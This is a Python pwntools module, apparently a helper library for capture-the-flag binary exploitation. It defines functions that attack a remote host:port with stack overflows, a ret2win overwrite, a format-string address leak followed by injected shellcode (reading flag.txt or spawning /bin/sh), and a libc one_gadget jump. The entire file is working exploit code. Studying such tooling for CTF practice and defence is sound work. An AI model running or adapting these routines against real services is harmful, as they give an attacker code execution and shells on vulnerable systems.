
from __future__ import annotations
import time
from pwn import asm, context, p64, remote, shellcraft, ELF
from pwn_helper.utils import extract_hex32

context.arch = "amd64"

def solve_handler_crash(host, port, line1="test", lengths=None):
    lengths = lengths or [200, 300, 400, 600]
    for n in lengths:
        io = remote(host, port)
        io.sendline(line1.encode())
        io.sendline(b"A" * n)
        out = io.recvall(timeout=2).decode(errors="ignore")
        flag = extract_hex32(out)
        print(f"[*] length={n} out={out!r}")
        io.close()
        if flag:
            return {"mode": "handler-crash", "length": n, "flag": flag, "output": out}
    return None

def solve_ret2win(host, port, target, offset, line1=None):
    io = remote(host, port)
    if line1 is not None:
        io.sendline(line1.encode())
    payload = b"A" * offset + p64(target)
    io.sendline(payload)
    out = io.recvall(timeout=2).decode(errors="ignore")
    flag = extract_hex32(out)
    io.close()
    if flag:
        return {"mode": "ret2win", "target": hex(target), "offset": offset, "flag": flag, "output": out}
    return {"mode": "ret2win", "target": hex(target), "offset": offset, "output": out}

def solve_fmt_shellcode(host, port, leak_slot, base_adjust, offset=120, payload="cat", prefix_nops=48, line_after=None):
    io = remote(host, port)
    io.sendline(f"%{leak_slot}$p".encode())
    leak = io.recvline(timeout=3).decode(errors="ignore").strip()
    if not leak.startswith("0x"):
        io.close()
        return {"mode": "fmt-shellcode", "error": f"invalid leak: {leak!r}"}

    leaked = int(leak, 16)
    buf = leaked - base_adjust

    if payload == "cat":
        sc = asm(shellcraft.cat("flag.txt"))
    elif payload == "sh":
        sc = asm(shellcraft.sh())
    elif payload == "ok":
        sc = asm(shellcraft.pushstr("OK\n") + shellcraft.write(1, "rsp", 3) + shellcraft.exit(0))
    else:
        io.close()
        return {"mode": "fmt-shellcode", "error": "payload must be cat/sh/ok"}

    body = b"\x90" * prefix_nops + sc
    if len(body) > offset:
        body = body[:offset]
    exploit = body + b"A" * (offset - len(body)) + p64(buf)
    io.sendline(exploit)

    if line_after:
        time.sleep(0.5)
        io.sendline(line_after.encode())

    out = io.recvrepeat(2).decode(errors="ignore")
    flag = extract_hex32(out)
    io.close()
    result = {"mode": "fmt-shellcode", "leak": leak, "base_adjust": hex(base_adjust), "target": hex(buf), "output": out}
    if flag:
        result["flag"] = flag
    return result

def solve_fmt_one_gadget(host, port, leak_slot, libc_path, ret_delta, one_gadget, offset=120):
    libc = ELF(libc_path)
    io = remote(host, port)
    io.sendline(f"%{leak_slot}$p".encode())
    leak = io.recvline(timeout=3).decode(errors="ignore").strip()
    if not leak.startswith("0x"):
        io.close()
        return {"mode": "fmt-one-gadget", "error": f"invalid leak: {leak!r}"}
    leaked = int(leak, 16)
    libc_base = leaked - (libc.symbols["__libc_start_main"] + ret_delta)
    target = libc_base + one_gadget
    payload = b"A" * offset + p64(target)
    io.sendline(payload)
    out = io.recvrepeat(2).decode(errors="ignore")
    io.close()
    flag = extract_hex32(out)
    result = {
        "mode": "fmt-one-gadget",
        "leak": leak,
        "ret_delta": hex(ret_delta),
        "libc_base": hex(libc_base),
        "one_gadget": hex(one_gadget),
        "target": hex(target),
        "output": out,
    }
    if flag:
        result["flag"] = flag
    return result
